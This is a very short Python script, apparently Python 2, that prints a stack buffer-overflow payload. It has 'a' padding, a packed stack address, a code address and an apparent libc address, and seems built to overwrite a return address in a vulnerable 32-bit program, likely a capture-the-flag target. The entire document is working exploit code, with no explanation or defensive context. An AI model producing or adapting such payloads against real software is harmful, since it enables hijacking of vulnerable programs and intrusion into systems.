import struct
print(64*"a" + struct.pack("I", 0xffffd180) + 8*"a" + struct.pack("I", 0x08049196) +
struct.pack("I", 0xf7de9ee5))